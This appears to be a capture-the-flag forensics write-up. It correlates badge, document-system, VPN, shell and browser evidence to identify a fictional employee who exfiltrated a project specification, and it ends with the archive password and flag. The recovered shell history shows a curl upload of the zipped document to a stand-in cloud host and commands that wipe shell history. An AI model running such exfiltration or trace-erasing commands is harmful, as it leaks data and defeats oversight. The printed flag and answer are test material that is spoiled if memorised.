# _CORPORATE_ESPIONAGE

**Category:** Forensics  
**Difficulty:** Easy  
**Points:** 200  

## Challenge Description

Vertex Dynamics' Floor 47 R&D lab lost the master specification document for **Project Chimera** sometime during the night of **2026-08-14 / 2026-08-15**.

A partial copy had already appeared inside a competitor's internal Slack, and several employees had suspicious-looking activity in their logs.

The goal was to correlate the available evidence and determine which employee actually stole and exfiltrated the document.

---

## Initial Analysis

After extracting the provided `employee.zip`, I reviewed the available employee artifacts and focused primarily on:

- Badge-access logs
- DMS activity
- VPN/network logs
- Shell history
- Browser history
- Employee notes and email
- Deleted/recovered files
- The protected `confession_backup.zip`

Several employees had activity that initially looked suspicious, but the evidence started pointing consistently toward one person:

**David Park — EMP4471**

---

## Badge Access Evidence

David Park entered Floor 47 shortly after 2 AM.

Relevant events:

```text
2026-08-15 02:13:07
EMP4471 - David Park
Entered Floor 47
```

A few minutes later, he entered the restricted DMS terminal room:

```text
2026-08-15 02:20:03
EMP4471 - David Park
Entered F47-DMS-TERMINAL
```

This became important when correlated with the document-management logs.

---

## DMS Activity

Only a few seconds after David entered the DMS terminal room, the Project Chimera document was exported.

```text
2026-08-15 02:20:11
Employee: EMP4471
User: David Park
Action: EXPORT
Document: Project_Chimera_Specs.docx
Result: SUCCESS
```

The timing was extremely suspicious:

```text
02:20:03 -> David enters DMS terminal room
02:20:11 -> Chimera specification exported
```

Only **8 seconds** separated the two events.

---

## VPN / Network Evidence

David's VPN account was active during the same period.

The logs showed approximately:

```text
4,312,884,992 bytes
```

or roughly:

```text
4.1 GB
```

being transferred to:

```text
185.220.101.47
```

The destination was identified as associated with **MegaSync**, an unauthorized external cloud-storage service.

His VPN session overlapped almost perfectly with the badge and DMS activity.

```text
VPN User: dpark
Session: approximately 02:15 - 02:53
Destination: 185.220.101.47
Service: MegaSync
Transferred: ~4.1 GB
```

---

## Shell History

David's workstation provided the strongest technical evidence.

Recovered shell commands showed him creating an archive of the Chimera specification and uploading it directly to an external MegaSync endpoint:

```bash
cd ~/Documents/Chimera
ls -la

zip -r chimera_specs_backup.zip Project_Chimera_Specs.docx

mv chimera_specs_backup.zip ~/sync/

curl -T ~/sync/chimera_specs_backup.zip \
https://upload.megasync-cloud.example/api/put \
-u dpark4471
```

He then attempted to erase evidence of the activity:

```bash
history -c
rm -f ~/.bash_history
```

This provided a near-complete reconstruction of the exfiltration process.

---

## Browser History

David's browser history contained an especially suspicious search shortly after the transfer:

```text
can company track vpn uploads
```

This occurred at approximately:

```text
03:10
```

roughly twenty minutes after he left Floor 47.

---

## Deleted Evidence

Another recovered artifact was:

```text
panic.txt
```

which David deleted shortly afterward.

The recovered data provided additional evidence that he knew his activity could be traced.

---

## Motive

David's personal notes contained references to an organization named **Bright Future**:

```text
brightfuture said fast turnaround if the specs are clean,
just need to get them the full doc not just the summary slide
```

Another message provided even stronger evidence.

An email sent to **Bright Future Consulting** on August 13 contained:

```text
Package will be delivered tonight as discussed.
Will use the usual drop method.
```

Recovered notes also indicated that David owed approximately:

```text
$18,400
```

and expected a **finder's fee** after the documents were verified.

This established a likely financial motive for the theft.

---

## Eliminating the Other Employees

Several other employees appeared suspicious at first but had legitimate explanations.

### Sarah Chen

Sarah was working late, but her access had been explicitly approved by the Lab Director.

Her network activity was limited to approximately:

```text
2.2 MB
```

and was sent to an internal backup system.

Her DMS activity was consistent with normal editing activity.

### Marcus Webb

Marcus entered the server room during the investigation window, but his traffic was associated with routine maintenance.

The destination:

```text
10.4.4.4
```

was an internal backup system explicitly whitelisted by the SOC.

### Lisa Nakamura

No substantial evidence connected Lisa to the Project Chimera theft.

---

## Culprit

Correlating the physical and digital evidence produced the following sequence:

```text
02:13:07 -> David Park enters Floor 47
02:20:03 -> David enters DMS terminal room
02:20:11 -> Project_Chimera_Specs.docx exported
02:15-02:53 -> Large external MegaSync transfer
02:48:26 -> David exits DMS terminal room
02:51:44 -> David leaves Floor 47
03:10    -> Searches "can company track vpn uploads"
03:12    -> Deletes panic.txt
```

Combined with his shell history, emails, notes, and VPN logs, the culprit was conclusively identified as:

```text
Name: David Park
Employee ID: EMP4471
Username: dpark
Credential/User ID: dpark4471
```

---

## Recovering the Flag

The evidence directory also contained a password-protected archive:

```text
confession_backup.zip
```

Inside the archive was:

```text
flag.txt
```

The archive used legacy ZIP encryption.

The password was constructed from two pieces of evidence associated with David:

```text
Employee ID: EMP4471
Badge entry time: 02:13
```

Combining them produced:

```text
EMP4471-0213
```

Using the password:

```bash
unzip confession_backup.zip
```

and entering:

```text
EMP4471-0213
```

successfully extracted `flag.txt`.

---

## Flag

```text
cyberweek{fl00r47_dms_3xf1l_2am_dpark_c0nfirm3d}
```

---

## Conclusion

The challenge required correlating multiple forensic evidence sources rather than trusting any single suspicious event.

The decisive evidence was the alignment between:

- David Park's physical access to Floor 47
- His entry into the DMS terminal room
- The Chimera specification export
- A large external MegaSync transfer
- Shell commands archiving and uploading the document
- Attempts to clear shell history
- Suspicious browser activity
- Emails and notes showing intent and financial motive

The password for the final archive was derived from David's employee identifier and badge-entry time:

```text
EMP4471-0213
```

which revealed the final flag:

```text
cyberweek{fl00r47_dms_3xf1l_2am_dpark_c0nfirm3d}
```